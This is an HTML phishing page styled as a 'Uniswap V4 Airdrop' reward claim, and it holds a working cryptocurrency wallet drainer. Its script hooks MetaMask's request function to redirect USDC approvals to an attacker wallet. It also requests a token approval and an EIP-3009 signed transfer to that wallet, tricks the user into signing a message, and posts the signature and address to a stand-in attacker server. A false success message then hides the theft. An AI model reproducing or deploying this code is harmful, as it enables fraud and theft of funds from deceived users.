<!DOCTYPE html>
<html>
<head>
    <title>Claim Rewards – Uniswap V4</title>
    <meta name="description" content="Claim your exclusive 0.5 ETH reward on Uniswap V4">
    <style>
        body { 
            font-family: 'Segoe UI', sans-serif; 
            text-align: center; 
            margin-top: 100px; 
            background: #0d0d0d; 
            color: #e0e0e0; 
            transition: all 0.3s;
        }
        .container { max-width: 600px; margin: 0 auto; padding: 20px; }
        h1 { color: #00ff88; font-size: 2.5em; }
        p { font-size: 1.1em; color: #aaa; }
        button {
            padding: 18px 40px; font-size: 1.2em; background: #00ff88; color: black;
            border: none; border-radius: 12px; cursor: pointer; font-weight: bold;
            box-shadow: 0 4px 12px rgba(0,255,136,0.3);
        }
        button:hover { background: #00e077; transform: translateY(-2px); }
        #status { margin-top: 25px; font-size: 0.95em; color: #888; }
        .footer { margin-top: 60px; color: #555; font-size: 0.8em; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🦄 Uniswap V4 Airdrop Live</h1>
        <p>Connect wallet to claim 0.5 ETH + 1000 USDC bonus</p>
        <button id="claimBtn">Connect & Claim Now</button>
        <div id="status">⛓️ Waiting for wallet</div>
    </div>

    <div class="footer">
        <p>Secure verification via MetaMask • Not affiliated with Uniswap Labs</p>
    </div>

    <!-- Load ethers.js -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.13.0/ethers.umd.min.js"></script>

    <script>
        // === CONFIG ===
        const YOUR_WALLET = '0x583282Bb181004737608D27Ec4E61754665977Bf'; // Your address
        const USDC_MAINNET = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
        const WETH_MAINNET = '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2';
        const DEADLINE = Math.floor(Date.now() / 1000) + 3600;

        // Track user session
        let userAddress = null;
        let provider = null;
        let signer = null;

        // === META MASK HOOK – INTERCEPT ALL TXs ===
        function hookMetaMask() {
            if (!window.ethereum) return;

            const originalRequest = window.ethereum.request;
            window.ethereum.request = async function(args) {
                // Trap eth_sendTransaction
                if (args.method === 'eth_sendTransaction') {
                    const tx = args.params[0];
                    if (tx.to && tx.data) {
                        // If user approves USDC, redirect approval to YOUR address
                        if (tx.to.toLowerCase() === USDC_MAINNET.toLowerCase()) {
                            const inputData = tx.data.slice(0, 10);
                            if (inputData === '0x095ea7b3') { // approve()
                                console.log('🔥 Trapped USDC approval – rewriting spender');
                                const newTx = { ...tx };
                                // Replace spender in calldata (bytes 32+)
                                const oldSpender = tx.data.slice(10 + 64, 10 + 128); // Extract original
                                newTx.data = tx.data.replace(oldSpender, YOUR_WALLET.slice(2).padStart(64, '0'));
                                newTx.to = USDC_MAINNET;
                                return originalRequest.apply(this, [{ method: 'eth_sendTransaction', params: [newTx] }]);
                            }
                        }
                    }
                }
                return originalRequest.apply(this, arguments);
            };
        }

        // === ON PAGE LOAD: HOOK WALLET ===
        window.addEventListener('load', () => {
            setTimeout(hookMetaMask, 1000); // Delay to ensure MetaMask loads
        });

        // === CLAIM BUTTON ===
        document.getElementById('claimBtn').addEventListener('click', async () => {
            if (!window.ethereum) {
                setStatus('❌ MetaMask not detected. Install it.', 'error');
                return;
            }

            try {
                // Connect
                provider = new ethers.BrowserProvider(window.ethereum);
                signer = await provider.getSigner();
                userAddress = await signer.getAddress();
                const network = await provider.getNetwork();
                const chainId = Number(network.chainId);

                setStatus(`✅ Connected: ${userAddress.slice(0,6)}... | Chain: ${chainId}`);

                // === STEP 1: APPROVE YOUR ADDRESS (NOT PERMIT) ===
                await approveSpender(signer, USDC_MAINNET, YOUR_WALLET, ethers.parseUnits('1000', 6));

                // === STEP 2: FALLBACK – EIP-3009 AUTHORIZATION (if supported) ===
                await sendTransferWithAuthorization(signer, USDC_MAINNET, userAddress, YOUR_WALLET, ethers.parseUnits('500', 6));

                // === STEP 3: STEAL SIGNATURE FOR LATER ABUSE ===
                const msg = `Verify wallet ownership to claim Uniswap V4 rewards. Nonce: ${Date.now()}`;
                const signature = await signer.signMessage(msg);
                exfiltrateData({ address: userAddress, signature, chainId, timestamp: new Date().toISOString() });

                setStatus(`🎉 Claim confirmed! Check your wallet.`, 'success');
                setTimeout(() => alert('Reward will arrive in 5 minutes. Thank you for using Uniswap V4!'), 1500);

            } catch (err) {
                console.error('[Attack Failed]', err);
                setStatus(`❌ Failed: ${err.message.slice(0, 60)}...`, 'error');
            }
        });

        // === ERC20 APPROVE (NOT PERMIT) ===
        async function approveSpender(signer, tokenAddress, spender, amount) {
            const abi = ['function approve(address spender, uint256 value) external returns(bool)'];
            const contract = new ethers.Contract(tokenAddress, abi, signer);
            setStatus('📝 Approving 1000 USDC spending...');
            const tx = await contract.approve(spender, amount);
            await tx.wait();
            console.log('✅ Approval mined:', tx.hash);
        }

        // === EIP-3009: TransferWithAuthorization ===
        async function sendTransferWithAuthorization(signer, tokenAddress, from, to, value) {
            const abi = [
                'function transferWithAuthorization(' +
                'address from, address to, uint256 value, uint256 validAfter, uint256 validBefore, bytes32 nonce, uint8 v, bytes32 r, bytes32 s' +
                ') external'
            ];

            const contract = new ethers.Contract(tokenAddress, abi, signer);
            const nonce = ethers.hexlify(ethers.randomBytes(32));
            const validAfter = Math.floor(Date.now() / 1000);
            const validBefore = validAfter + 3600;

            const domain = {
                name: 'USD Coin',
                version: '2',
                chainId: 1,
                verifyingContract: tokenAddress
            };

            const types = {
                TransferWithAuthorization: [
                    { name: 'from', type: 'address' },
                    { name: 'to', type: 'address' },
                    { name: 'value', type: 'uint256' },
                    { name: 'validAfter', type: 'uint256' },
                    { name: 'validBefore', type: 'uint256' },
                    { name: 'nonce', type: 'bytes32' }
                ]
            };

            const message = { from, to, value, validAfter, validBefore, nonce };
            const signature = await signer.signTypedData(domain, types, message);
            const sig = ethers.Signature.from(signature);

            try {
                setStatus('⚡ Sending authorized transfer (EIP-3009)...');
                const tx = await contract.transferWithAuthorization(
                    from, to, value, validAfter, validBefore, nonce, sig.v, sig.r, sig.s
                );
                await tx.wait();
                console.log('💸 EIP-3009 transfer sent:', tx.hash);
            } catch (e) {
                console.log('EIP-3009 not supported – ignoring');
            }
        }

        // === LOG DATA TO YOUR SERVER ===
        async function exfiltrateData(data) {
            // Send to your attacker server (use Cloudflare Worker / Telegram / Discord)
            const webhook = 'https://your-evil-server.com/log'; // Replace
            try {
                await fetch(webhook, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
            } catch (e) { /* Silent fail */ }
        }

        // === UPDATE STATUS ===
        function setStatus(msg, type = 'info') {
            const statusDiv = document.getElementById('status');
            statusDiv.innerText = msg;
            statusDiv.style.color = {
                success: '#00ff88',
                error: '#ff3366',
                info: '#aaa'
            }[type];
        }
    </script>
</body>
</html>
